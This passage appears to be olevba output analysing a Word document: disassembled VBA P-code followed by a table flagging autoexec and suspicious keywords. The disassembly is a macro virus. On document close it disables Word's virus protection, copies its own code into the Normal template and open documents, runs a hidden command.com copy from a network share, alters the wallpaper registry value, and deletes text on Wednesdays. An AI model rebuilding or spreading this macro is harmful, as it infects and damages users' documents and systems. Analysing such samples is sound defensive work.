' 	EndIfBlock 
' Line #198:
' 	EndIfBlock 
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' 	EndSub 
' Line #205:
' Line #206:
' 	FuncDefn (Private Sub CommandButton21_Click())
' Line #207:
' 	Dim 
' 	VarDefn a
' 	VarDefn B
' 	VarDefn Msg
' 	VarDefn Style
' 	VarDefn Title
' 	VarDefn Response
' 	VarDefn Msg1
' 	VarDefn Style1
' 	VarDefn Title1
' 	VarDefn Response1
' 	VarDefn Msg2
' 	VarDefn Style2
' 	VarDefn Title2
' 	VarDefn Response2
' Line #208:
' Line #209:
' 	LitStr 0x0052 "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\dover.doc"
' 	St a 
' Line #210:
' 	LitStr 0x004D "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2dover2.doc"
' 	St B 
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' 	LitStr 0x0027 "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"
' 	St Msg 
' 	QuoteRem 0x0031 0x000B " Ñîîáùåíèå."
' Line #217:
' 	Ld vbYesNo 
' 	Ld vbDefaultButton2 
' 	Add 
' 	St Style 
' 	QuoteRem 0x0024 0x0008 " Êíîïêè."
' Line #218:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title 
' 	QuoteRem 0x0017 0x000B " Çàãîëîâîê."
' Line #219:
' 	Ld Msg 
' 	Ld Style 
' 	Ld Title 
' 	ArgsLd MsgBox 0x0003 
' 	St Response 
' Line #220:
' Line #221:
' Line #222:
' 	Ld Response 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0019 0x001A " Íàæàòà êíîïêà "Äà" (Yes)."
' Line #223:
' Line #224:
' 	Ld a 
' 	Ld B 
' 	ArgsCall FileCopy 0x0002 
' Line #225:
' 	LitStr 0x0051 "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2vipiska2.doc"
' 	ArgsCall Kill 0x0001 
' Line #226:
' Line #227:
' Line #228:
' Line #229:
' 	Ld Time 
' 	LitDate 0x5555 0x5555 0x5555 0x3FE5 
' 	Gt 
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #230:
' Line #231:
' Line #232:
' 	LitStr 0x002E "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"
' 	St Msg1 
' 	QuoteRem 0x0039 0x000B " Ñîîáùåíèå."
' Line #233:
' 	Ld vbOKOnly 
' 	St Style1 
' Line #234:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title1 
' 	QuoteRem 0x0018 0x000B " Çàãîëîâîê."
' Line #235:
' 	Ld Msg1 
' 	Ld Style1 
' 	Ld Title1 
' 	ArgsLd MsgBox 0x0003 
' 	St Response1 
' Line #236:
' 	ElseBlock 
' Line #237:
' Line #238:
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Gt 
' 	Ld Time 
' 	LitDate 0x38E4 0xE38E 0x8E38 0x3FE7 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #239:
' Line #240:
' Line #241:
' 	LitStr 0x002E "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"
' 	St Msg2 
' 	QuoteRem 0x0039 0x000B " Ñîîáùåíèå."
' Line #242:
' 	Ld vbOKOnly 
' 	St Style2 
' Line #243:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title2 
' 	QuoteRem 0x0018 0x000B " Çàãîëîâîê."
' Line #244:
' 	Ld Msg2 
' 	Ld Style2 
' 	Ld Title2 
' 	ArgsLd MsgBox 0x0003 
' 	St Response2 
' Line #245:
' Line #246:
' Line #247:
' 	EndIfBlock 
' Line #248:
' 	EndIfBlock 
' Line #249:
' 	EndIfBlock 
' Line #250:
' Line #251:
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' Line #256:
' 	EndSub 
' Line #257:
' Line #258:
' 	FuncDefn (Private Sub Document_Close())
' Line #259:
' Line #260:
' 	OnError (Resume Next) 
' Line #261:
' Line #262:
' 	Dim (Const) 
' 	LitStr 0x0010 "Black Wednesday!"
' 	VarDefn Kuku
' Line #263:
' Line #264:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #265:
' 	Dim 
' 	VarDefn SaveDoc
' 	VarDefn SaveNormalTempl
' 	VarDefn DocInfected
' 	VarDefn NormalTemplInfected (As Boolean)
' Line #266:
' 	Dim 
' 	VarDefn ActDoc
' 	VarDefn NormTempl (As Object)
' Line #267:
' 	Dim 
' 	VarDefn MyCod
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #268:
' 	Dim 
' 	VarDefn a1
' 	VarDefn FileLocal
' 	VarDefn FileServer (As Integer)
' Line #269:
' Line #270:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #271:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ActDoc 
' Line #272:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NormTempl 
' Line #273:
' Line #274:
' 	Ld Kuku 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocInfected 
' Line #275:
' 	Ld Kuku 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NormTempl 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplInfected 
' Line #276:
' Line #277:
' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
' Line #278:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #279:
' Line #280:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #281:
' 	StartWithExpr 
' 	Ld fs 
' 	With 
' Line #282:
' 	LitStr 0x0003 "C:\"
' 	MemStWith LookIn 
' Line #283:
' 	LitStr 0x000C "NetSetup.log"
' 	MemStWith FileName 
' Line #284:
' 	MemLdWith Execute 
' 	St FileLocal 
' Line #285:
' 	EndWith 
' Line #286:
' 	StartWithExpr 
' 	Ld fs 
' 	With 
' Line #287:
' 	LitStr 0x0010 "\\post\temp\1000"
' 	MemStWith LookIn 
' Line #288:
' 	LitStr 0x000C "NetSetup.log"
' 	MemStWith FileName 
' Line #289:
' 	MemLdWith Execute 
' 	St FileServer 
' Line #290:
' 	EndWith 
' Line #291:
' Line #292:
' 	Ld FileServer 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #293:
' 	Ld FileLocal 
' 	LitDI2 0x0000 
' 	Le 
' 	Paren 
' 	IfBlock 
' Line #294:
' 	LitStr 0x0041 "command.com /c copy \\post\temp\1000\NetSetup.log c:\NetSetup.log"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #295:
' 	ElseBlock 
' Line #296:
' 	LitStr 0x001D "\\post\temp\1000\NetSetup.log"
' 	ArgsLd FileLen 0x0001 
' 	LitStr 0x000F "c:\NetSetup.log"
' 	ArgsLd FileLen 0x0001 
' 	Ne 
' 	IfBlock 
' Line #297:
' 	LitStr 0x0041 "command.com /c copy \\post\temp\1000\NetSetup.log c:\NetSetup.log"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #298:
' 	EndIfBlock 
' Line #299:
' 	EndIfBlock 
' Line #300:
' 	EndIfBlock 
' Line #301:
' Line #302:
' 	LineCont 0x0004 08 00 00 00
' 	LitStr 0x000F "c:\NetSetup.log"
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_USER\Control Panel\Desktop"
' 	LitStr 0x0009 "WallPaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #303:
' Line #304:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbWednesday 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #305:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	LitDI2 0x0014 
' 	ParamNamed Count 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall MoveDown 0x0003 
' Line #306:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0002 
' Line #307:
' 	EndIfBlock 
' Line #308:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #309:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #310:
' Line #311:
' Line #312:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #313:
' 	Ld DocInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #314:
' Line #315:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTempl 
' Line #316:
' Line #317:
' 	LitDI2 0x0001 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St MyCod 
' Line #318:
' Line #319:
' 	Ld NormTempl 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a1 
' Line #320:
' 	LitDI2 0x0001 
' 	Ld a1 
' 	Ld NormTempl 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #321:
' 	Ld MyCod 
' 	Ld NormTempl 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #322:
' Line #323:
' 	Ld SaveNormalTempl 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #324:
' Line #325:
' 	EndIfBlock 
' Line #326:
' Line #327:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #328:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #329:
' Line #330:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDoc 
' Line #331:
' Line #332:
' 	LitDI2 0x0001 
' 	Ld NormTempl 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NormTempl 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #333:
' Line #334:
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a1 
' Line #335:
' 	LitDI2 0x0001 
' 	Ld a1 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #336:
' 	Ld OurCode 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #337:
' Line #338:
' 	Ld SaveDoc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #339:
' Line #340:
' 	EndIfBlock 
' Line #341:
' Line #342:
' Line #343:
' 	EndIfBlock 
' Line #344:
' Line #345:
' 	EndSub 
' Line #346:
' Line #347:
' Line #348:
' Line #349:
' Line #350:
' Line #351:
' Line #352:
' Line #353:
' Line #354:
' Line #355:
' Line #356:
' Line #357:
' Line #358:
' Line #359:
' Line #360:
' Line #361:
' Line #362:
' Line #363:
' Line #364:
' Line #365:
' Line #366:
' Line #367:
' Line #368:
' Line #369:
' Line #370:
' Line #371:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

